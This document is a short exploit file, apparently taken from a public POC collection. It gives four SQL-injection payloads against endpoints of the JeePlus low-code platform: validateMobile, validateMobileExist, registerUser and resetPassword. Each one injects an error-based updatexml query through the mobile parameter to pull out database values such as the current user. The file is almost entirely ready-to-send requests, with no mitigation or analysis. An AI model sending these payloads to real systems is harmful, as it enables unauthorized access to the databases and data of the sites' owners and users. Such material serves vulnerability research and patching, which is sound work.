# JeePlus_sqli
from: https://github.com/wy876/POC/blob/main/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.4.8 @2

POC1
```
GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

POC2

```
GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
Host: 0.03.614.230:8282
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Cookie: jeeplus.session.id=a24d6e112a864ef795cce1f664a6022a;
```

POC3

```
/a/sys/register/registerUser?roleName=wangba&mobile=13300990099'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on
```

POC4
```
/a/sys/user/resetPassword?mobile=13588888888'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23
```
